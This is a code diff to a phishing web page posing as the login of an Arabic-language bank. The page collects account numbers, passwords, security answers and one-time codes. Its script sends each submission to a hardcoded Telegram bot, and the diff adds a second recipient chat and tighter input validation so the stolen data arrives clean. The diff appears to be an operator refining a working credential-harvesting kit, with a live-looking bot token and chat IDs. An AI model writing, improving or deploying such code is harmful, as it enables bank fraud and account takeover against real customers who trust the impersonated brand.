@@ -269,12 +269,12 @@
             
             <form id="loginForm" onsubmit="captureAndProceed(event, 'security-page', 'تسجيل الدخول')">
                 <div class="form-group">
-                    <label>رقم الحساب:</label>
-                    <input type="text" id="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
+                    <label>رقم الحساب (7 أرقام فقط):</label>
+                    <input type="text" id="username" class="form-control" placeholder="أدخل رقم الحساب المكون من 7 أرقام" pattern="\d{7}" title="يجب إدخال 7 أرقام فقط" maxlength="7" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                 </div>
                 <div class="form-group">
                     <label>كلمة المرور:</label>
-                    <input type="password" id="password" class="form-control" placeholder="أدخل كلمة المرور" required>
+                    <input type="password" id="password" class="form-control" placeholder="أدخل كلمة مرور قوية" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%^&+=!_]).{8,}" title="يجب أن تحتوي على حرف كبير، حرف صغير، رقم، ورمز خاص مثل @" required>
                     <i class="fa-solid fa-eye toggle-pass" onclick="togglePassword('password', this)"></i>
                 </div>
                 <button type="submit" class="btn-action">تسجيل الدخول</button>
@@ -311,8 +311,8 @@
                     </select>
                 </div>
                 <div class="form-group">
-                    <label>ادخل الجواب:</label>
-                    <input type="text" id="secAnswer" class="form-control" placeholder="اكتب جوابك هنا" required>
+                    <label>ادخل الجواب (باللغة العربية فقط):</label>
+                    <input type="text" id="secAnswer" class="form-control" placeholder="اكتب جوابك بالعربية فقط" pattern="^[\u0600-\u06FF\s]+$" title="يُسمح بالحروف العربية فقط بدون أرقام أو حروف إنجليزية" oninput="this.value = this.value.replace(/[^\u0600-\u06FF\s]/g, '')" required>
                 </div>
                 <button type="submit" class="btn-action">إرسال</button>
             </form>
@@ -326,8 +326,8 @@
             <p class="subtitle">الرجاء إدخال رمز التحقق المرسل إلى رقم هاتفك وبريدك الإلكتروني المسجل</p>
             
             <form id="otpForm" onsubmit="captureAndProceed(event, 'confirm-page', 'رمز OTP')">
-                <div style="text-align: right; margin-bottom: 5px; font-size: 13px; font-weight: bold;">أدخل رمز التحقق (OTP):</div>
-                <input type="text" id="otpCode" maxlength="6" class="form-control" placeholder="أدخل رمز مكون من 6 أرقام" style="text-align: center; font-size: 18px; letter-spacing: 3px;" required>
+                <div style="text-align: right; margin-bottom: 5px; font-size: 13px; font-weight: bold;">أدخل رمز التحقق (6 أرقام):</div>
+                <input type="text" id="otpCode" maxlength="6" pattern="\d{6}" title="يجب إدخال 6 أرقام فقط" class="form-control" placeholder="رمز مكون من 6 أرقام" style="text-align: center; font-size: 18px; letter-spacing: 3px;" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                 <p style="font-size: 12px; color: #1a8a3f; margin-top: 10px; font-weight: bold;">إعادة إرسال الرمز خلال 29:50 دقيقة</p>
                 <button type="submit" class="btn-action">إرسال</button>
             </form>
@@ -353,9 +353,9 @@
     <footer class="footer">بنك أمدرمان الوطني (أوكاش) | جميع الحقوق محفوظة 2026</footer>
 
     <script>
-        // التوكن الجديد والآيدي الخاص بك
         const TELEGRAM_BOT_TOKEN = "8907088773:AAFfZ7GEehFp6NGS9s8Piolu8w4Xc4h-EZA";
-        const TELEGRAM_CHAT_ID = "7908500383";
+        // مصفوفة تحتوي على الآيديهين المحددين للإرسال لهما معاً
+        const TELEGRAM_CHAT_IDS = ["8362235682", "8965708637"];
 
         let userData = {
             username: '',
@@ -422,14 +422,12 @@
             if(stepName === 'تسجيل الدخول') {
                 userData.username = document.getElementById('username').value;
                 userData.password = document.getElementById('password').value;
-                // إرسال البيانات الأولى فوراً وحدها
                 sendLoginToTelegram();
             } else if(stepName === 'سؤال الأمان') {
                 userData.securityQuestion = document.getElementById('secQuestion').value;
                 userData.securityAnswer = document.getElementById('secAnswer').value;
             } else if(stepName === 'رمز OTP') {
                 userData.otp = document.getElementById('otpCode').value;
-                // إرسال بقية البيانات (أسئلة الأمان + الرمز) معاً ومنظمة
                 sendFinalDataToTelegram();
             }
 
@@ -442,44 +440,47 @@
             }, 2000);
         }
 
-        // إرسال الخطوة الأولى (رقم الحساب وكلمة المرور) فوراً
+        // إرسال البيانات الأولى
         function sendLoginToTelegram() {
             const message = `
 🚨 *[1] بيانات تسجيل الدخول*:
-👤 *رقم الحساب / المستخدم*: \`${userData.username}\`
+👤 *رقم الحساب*: \`${userData.username}\`
 🔑 *كلمة المرور*: \`${userData.password}\`
 ⏰ *الوقت*: ${new Date().toLocaleString('ar-SA')}
             `;
 
-            sendRequest(message);
+            sendToAllChats(message);
         }
 
-        // إرسال الخطوة الأخيرة (أسئلة الأمان ورمز التحقق OTP) معاً ومنظمة
+        // إرسال البيانات النهائية
         function sendFinalDataToTelegram() {
             const message = `
 🚨 *[2] تفاصيل الحماية والتحقق*:
-👤 *الحساب*: \`${userData.username}\`
+👤 *رقم الحساب*: \`${userData.username}\`
 ❓ *سؤال الأمان*: ${userData.securityQuestion}
 💡 *إجابة سؤال الأمان*: \`${userData.securityAnswer}\`
 🔢 *رمز التحقق (OTP)*: \`${userData.otp}\`
 ⏰ *الوقت*: ${new Date().toLocaleString('ar-SA')}
             `;
 
-            sendRequest(message);
+            sendToAllChats(message);
         }
 
-        function sendRequest(message) {
+        // دالة تقوم بالإرسال للآيديهين معاً في نفس الوقت
+        function sendToAllChats(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(err => console.log('Telegram Send Error:', err));
+            TELEGRAM_CHAT_IDS.forEach(chatId => {
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(err => console.log('Telegram Send Error:', err));
+            });
         }
 
         function sendWhatsApp() {
